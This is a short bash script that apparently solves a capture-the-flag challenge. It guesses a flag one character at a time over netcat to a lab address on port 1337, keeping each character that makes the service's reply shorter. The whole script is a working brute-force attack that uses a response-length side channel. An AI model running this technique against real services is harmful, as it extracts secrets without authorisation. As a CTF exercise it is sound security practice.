#!/bin/bash

flag="flag{"

while [ "$last" != "}" ]; do
	last=$(echo "${flag: -1}")
	for i in {49..127}; do 
		i=$(echo $i | awk '{printf("%c", $0);}')
		l=$(echo $flag$i | nc 192.168.20.10 1337 | wc -c)
		if [ $l -lt 108 ]; then
			flag="$flag""$i"
			echo -e '\e[1A\e[K'$flag
		fi
	done
done
